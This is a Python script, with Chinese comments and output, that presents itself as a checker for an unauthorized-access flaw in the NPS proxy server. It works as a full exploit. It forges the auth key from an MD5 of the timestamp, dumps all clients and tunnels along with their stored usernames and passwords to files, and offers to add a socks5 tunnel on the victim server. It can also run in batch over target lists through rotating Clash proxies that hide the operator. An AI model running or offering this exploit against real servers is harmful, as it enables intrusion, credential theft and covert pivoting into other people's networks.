import hashlib
import json
import os
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()

# 复用 crawler 目录下已有的 Clash 自动切换代理服务（方案A：不重写，直接引入）
_CRAWLER_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "../..", "..", "crawler"))
if _CRAWLER_DIR not in sys.path:
    sys.path.insert(0, _CRAWLER_DIR)

try:
    from clash_auto_switch_service import ClashAutoSwitchService
except ImportError:
    ClashAutoSwitchService = None

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
           "Accept": "application/json, text/javascript, */*; q=0.01",
           "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
           "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded",
           "X-Requested-With": "XMLHttpRequest"}


class NPS:
    def __init__(self, target, search_mode, clash_service=None):
        self.url = self.deal_target(target)
        self.search_mode = search_mode
        self.clash_service = clash_service

    def _get_proxies(self):
        """启用 Clash 时，返回当前轮换出口的代理地址；否则直连。"""
        if self.clash_service is not None:
            return self.clash_service.get_proxy()
        return None

    def deal_target(self, target):
        if "http" not in target:
            host = "http://" + target
        else:
            host = target
        URL = host.split("//")[0] + "//" + host.split("//")[1].split("/")[0]
        return URL

    @staticmethod
    def get_parameter(self):
        """获取auth_key及timestamp"""
        timestamp = int(time.time())
        m = hashlib.md5()
        m.update(str(int(timestamp)).encode("utf8"))
        auth_key = m.hexdigest()
        return auth_key, timestamp

    def get_client(self):
        """获取客户端"""
        auth_key, timestamp = self.get_parameter(self)
        url1 = self.url + "/client/list"
        data = {"search": '', "order": "asc", "offset": "0", "limit": "1000",
                "auth_key": auth_key, "timestamp": timestamp}
        try:
            res = requests.post(url1, headers=headers, data=data, verify=False, timeout=6,
                                proxies=self._get_proxies())
            dict_date = json.loads(res.content)
            count = dict_date['total']
            for i in range(count):
                rows = dict_date['rows'][i]
                client_id = rows['Id']
                client_Addr = rows['Addr']
                client_IsConnect = rows['IsConnect']
                Remark = rows['Remark']
                Status = rows['Status']
                print(f"客户端ID:{client_id} 客服端地址:{client_Addr} 状态:{Status} 客户端状态:{client_IsConnect} 备注:{Remark}")
                name = self.url.split('//')[1].replace(':', '_').replace("/", '')
                if not os.path.exists("result"):
                    os.mkdir("result")
                with open(f"result/{name}.txt", "a", encoding="utf-8") as f:
                    f.write(f"客户端ID:{client_id} 客服端地址:{client_Addr} 状态:{Status} 客户端状态:{client_IsConnect} 备注:{Remark}\n")
            print("-" * 100)
            return True
        except Exception as e:
            error = str(e.args[0])
            if "由于目标计算机积极拒绝" in error or "HTTPConnectionPool" in error:
                print("目标地址访问失败。")
            elif "Expecting value" in error:
                print("nps未授权访问漏洞已修复。")
            else:
                print(f"发生其他错误：{error}")
            print("-" * 100 + "\n")
            return False

    def get_tunnel(self, type):
        """获取代理隧道"""
        auth_key, timestamp = self.get_parameter(self)
        url = self.url + "/index/gettunnel"
        data = {"offset": "0", "limit": "1000", "type": type, "client_id": '', "search": '',
                "auth_key": auth_key, "timestamp": timestamp}
        res = requests.post(url, headers=headers, data=data, verify=False, timeout=6,
                            proxies=self._get_proxies())
        dict_date = json.loads(res.content)
        count = dict_date['total']
        for i in range(count):
            rows = dict_date['rows'][i]
            Port = rows['Port']
            Mode = rows['Mode']
            Addr = rows['Client']['Addr']
            client_id = rows['Client']['Id']
            Status = rows['Client']['Status']
            IsConnect = rows['Client']['IsConnect']
            Basic_user = rows['Client']['Cnf']['U']
            Basic_pass = rows['Client']['Cnf']['P']
            Remark = rows['Remark']
            Target = rows['Target']['TargetStr']

            print(f"客户端ID:{client_id} 模式:{Mode} 端口:{Port} 客服端地址:{Addr} 目标地址:{Target} 状态:{Status} 客服端状态:{IsConnect} "
                  f"认证用户名:{Basic_user} 认证密码:{Basic_pass} 备注:{Remark}")
            name = self.url.split('//')[1].replace(':', '_').replace("/", '')
            if not os.path.exists("result"):
                os.mkdir("result")
            with open(f"result/{name}.txt", "a", encoding="utf-8") as f:
                f.write(
                    f"客户端ID:{client_id} 模式:{Mode} 端口:{Port} 客服端地址:{Addr} 目标地址:{Target} 状态:{Status} 客服端状态:{IsConnect} 认证用户名:{Basic_user} 认证密码:{Basic_pass} 备注:{Remark}\n")

    def add_socks5(self, client_id, port):
        """添加sockes5隧道"""
        auth_key, timestamp = self.get_parameter(self)
        url1 = self.url + "/index/add"
        data = {"type": "socks5", "client_id": client_id, "remark": '', "port": port, "target": '', "local_path": '',
                "strip_pre": '', "password": '', "auth_key": auth_key, "timestamp": timestamp}
        res = requests.post(url1, headers=headers, data=data, verify=False, timeout=6,
                            proxies=self._get_proxies())
        if '"status": 1' in res.text:
            print("添加socks5代理成功！")
            print("-" * 100)
            self.get_tunnel("socks5")  # 输出添加后的socks5代理列表
            print("-" * 100)
            return True
        elif "未找到客户端" in res.text:
            print("添加代理失败，客服端ID错误，请重新添加。")
            return False
        elif "The port cannot" in res.text:
            print("添加代理失败，端口被占用，请重新添加。")
            return False
        else:
            return False

    def run(self):
        print(f"测试：{self.url}")
        print("-" * 100)
        is_con = self.get_client()
        if not is_con:
            pass
        else:
            mode_list = ['tcp', 'udp', 'socks5', 'httpProxy', 'secret', 'p2p', 'file']
            for mode in mode_list:
                self.get_tunnel(mode)
            print("-" * 100 + "\n")
            if self.search_mode == "single":
                is_add = input("是否添加socks5代理(y/N):")
                if is_add == 'y' or is_add == 'Y':
                    while True:
                        info = input("请输入客户端ID及端口(2 4444):")
                        client_id = info.split(" ")[0]
                        port = info.split(" ")[1]
                        is_suss = self.add_socks5(client_id, port)
                        if is_suss:
                            break


def banner():
    print(r"""
  _   _             _    _                   _   _                _             _    _____                 
 | \ | |           | |  | |                 | | | |              (_)           | |  / ____|                
 |  \| |_ __  ___  | |  | |_ __   __ _ _   _| |_| |__   ___  _ __ _ _______  __| | | (___   ___ __ _ _ __  
 | . ` | '_ \/ __| | |  | | '_ \ / _` | | | | __| '_ \ / _ \| '__| |_  / _ \/ _` |  \___ \ / __/ _` | '_ \ 
 | |\  | |_) \__ \ | |__| | | | | (_| | |_| | |_| | | | (_) | |  | |/ /  __/ (_| |  ____) | (_| (_| | | | |
 |_| \_| .__/|___/  \____/|_| |_|\__,_|\__,_|\__|_| |_|\___/|_|  |_/___\___|\__,_| |_____/ \___\__,_|_| |_|
       | |                                                                                                 
       |_|                                                                                                                                                                                          
    nps未授权访问漏洞检测脚本 v1.1          by:ifory                                        
""")


if __name__ == '__main__':
    banner()

    import argparse

    parser = argparse.ArgumentParser(
        description="NPS 未授权访问漏洞检测脚本（可选走 Clash 复用现有代理轮换服务）")
    parser.add_argument("-t", dest="target", help="单个目标URL")
    parser.add_argument("-f", dest="file", help="从txt文件批量导入URL")
    parser.add_argument("--clash", action="store_true",
                        help="启用 Clash 自动切换代理，复用 clash_auto_switch_service")
    parser.add_argument("--clash-api", default="http://127.0.0.1:9090", help="Clash RESTful API 地址")
    parser.add_argument("--clash-secret", default="1212121", help="Clash API secret")
    parser.add_argument("--clash-port", type=int, default=7899, help="Clash 本地混合代理端口")
    parser.add_argument("--clash-interval", type=int, default=10, help="Clash 节点自动切换间隔(秒)")
    args = parser.parse_args()

    if not args.target and not args.file:
        print("Help: -t 目标URL\n      -f 从txt文件中导入URL批量查询\n      --clash 走 Clash 复用现有轮换服务")
        sys.exit(0)

    clash_service = None
    if args.clash:
        if ClashAutoSwitchService is None:
            print("[Clash] 未能导入 clash_auto_switch_service，请确认该文件存在，本次改为直连。")
        else:
            clash_service = ClashAutoSwitchService(
                clash_api=args.clash_api,
                clash_secret=args.clash_secret,
                clash_proxy_port=args.clash_port,
                switch_interval=args.clash_interval,
            )
            clash_service.start()
            print(f"[Clash] 已启用代理轮换 | 策略组: {clash_service._group_name} | "
                  f"当前节点: {clash_service.get_current_node()} | 节点数: {len(clash_service.get_nodes())}")
            print("-" * 100)

    try:
        if args.target:
            NPS(args.target, "single", clash_service).run()
        elif args.file:
            with open(args.file, 'r', encoding='utf-8') as f:
                for key in f.readlines():
                    url = key.strip()
                    if not url:
                        continue
                    NPS(url, "batch", clash_service).run()
    finally:
        if clash_service is not None:
            clash_service.stop()